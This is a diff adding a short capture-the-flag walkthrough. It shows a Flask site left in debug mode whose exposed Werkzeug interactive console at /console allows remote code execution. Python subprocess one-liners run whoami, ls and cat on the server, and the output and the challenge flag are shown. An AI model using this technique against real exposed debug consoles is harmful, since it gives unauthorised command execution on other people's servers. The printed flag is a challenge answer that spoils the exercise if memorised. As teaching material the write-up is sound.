@@ -1,0 +1,38 @@
+On fuzzing the /film directory /film/console gives assersion error.
+This is great because we now know that the site is in debugging mode
+also we now know that the site is using Flask as a web framework, Flask is a web framework
+which became very popular in recent years mostly due to it simplicity,
+the framework depends on a web server gateway interface (WSGI) library called Werkzeug,
+A WSGI is a calling convention for web servers to forward requests to web frameworks (in our case Flask).
+
+Werkzeug also provides web servers with a debugger and a console to execute Python expression from,
+we can find this console by navigating to /console:
+
+Interactive Console
+In this console you can execute Python expressions in the context of the application.
+The initial namespace was created by the debugger automatically.
+[console ready]
+>>> 
+
+From this console we can execute commands on the server (RCE):
+Upon executing the command:
+
+import subprocess;out = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
+
+the command simply imports the subprocess library, creates a new process that executes whoami and
+prints the output of the command.
+The command worked!, now we can execute ls to see which files are in our working directory,
+doing so we can see that there's a file called flag.txt in there,
+and by using cat on the file we get the flag.
+
+by doing so we get:
+
+[console ready]
+>>> 
+>>> import subprocess;out = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
+b'user\n'
+>>> import subprocess;out = subprocess.Popen(['ls'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
+b'flag.txt\nmain.py\nrequirements.txt\ntemplates\n'
+>>> import subprocess;out = subprocess.Popen(['cat', 'flag.txt'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
+b'flag{weurkzerg_the_worst_kind_of_debug}'
+>>> 
